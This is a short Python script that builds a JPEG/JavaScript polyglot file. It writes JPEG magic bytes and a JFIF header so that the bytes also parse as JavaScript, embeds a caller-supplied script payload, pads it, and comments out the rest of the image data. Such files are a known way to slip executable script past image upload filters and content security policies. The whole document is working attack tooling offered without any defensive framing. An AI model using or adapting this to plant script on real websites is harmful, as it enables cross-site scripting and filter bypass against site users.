import sys, struct


def jpg_check_dims(height, width):
  if height < 1 or height > 65535:
    print('error: height has to be in interval: 1 <= height <= 65535')
    sys.exit(1)

  if width < 1 or width > 65535:
    print('error: width has to be in interval: 1 <= width <= 65535')
    sys.exit(1)


def craft_jpg_polyglot(height, width, payload):
  # jpg magic bytes
  data = b'\xFF\xD8\xFF\xE0'

  # tab + colon to get rid of JFIF as a label statement
  # this 'nubmer' is used to establish block size
  data += b'\x09\x3A'
  # JFIF header
  data += b'\x4A\x46\x49\x46'

  # assign JFIF varialbe: JFIF=1;
  pay = '=1;'
  
  if(len(payload) > 0 and payload[-1] != ';'):
    print('[+] added a semicolon at the end of the command')
    payload += ';'

  pay += payload
  
  # ignore rest of the 'image' as js code
  pay += '/*'
  
  # block padding
  # 093A is 2362 in decimal
  # substract 6 bytes from this number as per the header (label, JFIF)
  # 2362 - 6 = 2356
  nopsled = 2356
  
  if len(payload) > nopsled:
    print('error: payload cannot be longer that nopsled')
    sys.exit(1)
  
  # substract our payload from nopsled
  nopsled = nopsled - len(pay)
  
  # add payload to jpg
  data += pay.encode('utf-8')
  
  # insert nopsled after payload
  data += b'\x00' * nopsled
  
  # new block
  data += b'\xFF\xC0\x00\x11\x08'
  
  data += struct.pack('!H', height)
  data += struct.pack('!H', width)
  
  # end of multiline js comment
  data += b'\x2A\x2F'
  
  # end of jpg img marker
  data += b'\xFF\xD9'
  
  return data